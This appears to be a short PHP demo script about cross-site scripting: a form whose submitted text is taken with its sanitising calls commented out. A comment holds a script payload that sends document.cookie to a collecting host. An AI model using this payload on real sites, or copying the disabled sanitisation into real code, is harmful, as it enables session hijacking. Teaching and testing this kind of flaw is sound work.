<?php

/**
 * XSS(Cross Site Scripting).
 */
switch ($_SERVER['REQUEST_METHOD']) {
    case 'GET':
        if (array_key_exists('PHPSESSID', $_GET)) {
            $_GET['PHPSESSID'];
        } else {
            echo <<<'HTML'
        <form action="/" method="POST">
            <textarea name="text" style="width: 320px; height: 320px; display: block;"></textarea>
            <input type="submit">
        </form>
HTML;
        }
        break;
    case 'POST':
        /**
         * <script>location.href="http://localhost/?" + document.cookie</script>.
         */
        if (array_key_exists('text', $_POST)) {
            $content = $_POST['text'];
            //  htmlentities($content);
            //  filter_var($content, FILTER_SANITIZE_FULL_SPECIAL_CHARS);
        }
        break;
}
